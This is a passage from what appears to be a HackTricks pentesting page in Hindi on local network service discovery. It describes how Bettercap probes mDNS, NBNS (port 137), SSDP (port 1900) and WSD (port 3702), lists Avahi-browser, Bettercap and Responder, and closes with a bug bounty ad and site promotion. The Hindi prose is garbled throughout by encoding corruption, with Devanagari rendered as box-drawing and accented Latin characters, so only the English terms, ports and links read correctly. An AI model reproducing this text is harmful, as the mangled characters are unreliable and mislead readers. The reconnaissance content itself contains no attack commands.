Bettercap рдПрдХ MDNS рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ X рдорд┐рд▓реАрд╕реЗрдХрдВрдб рдореЗрдВ) **\_services\_.dns-sd.\_udp.local** рдХреЗ рд▓рд┐рдП, рдЬреЛ рдорд╢реАрди рдЗрд╕ рдкреИрдХреЗрдЯ рдХреЛ рджреЗрдЦрддреА рд╣реИ рд╡рд╣ рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддреА рд╣реИред рдлрд┐рд░, рдпрд╣ рдХреЗрд╡рд▓ "рд╕реЗрд╡рд╛рдУрдВ" рдХреЗ рд▓рд┐рдП рдЙрддреНрддрд░ рджреЗрдиреЗ рд╡рд╛рд▓реА рдорд╢реАрдиреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИред

**рдЙрдкрдХрд░рдг**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios рдирд╛рдо рд╕рд░реНрд╡рд░)**

Bettercap рдирд╛рдо "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" рдХреЗ рд▓рд┐рдП рдкреЛрд░реНрдЯ 137/UDP рдореЗрдВ рдкреНрд░рд╕рд╛рд░рд┐рдд рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред

### **SSDP (рд╕рд┐рдореНрдкрд▓ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)**

Bettercap SSDP рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд░рд╣рд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 1900)ред

### **WSD (рд╡реЗрдм рд╕реЗрд╡рд╛ рдЦреЛрдЬ)**

Bettercap WSD рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд░рд╣рд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 3702)ред

## рд╕рдВрджрд░реНрдн

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ **Intigriti** рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдЖрдЬ рд╣реА, рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рддрдХ **$100,000** рддрдХ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
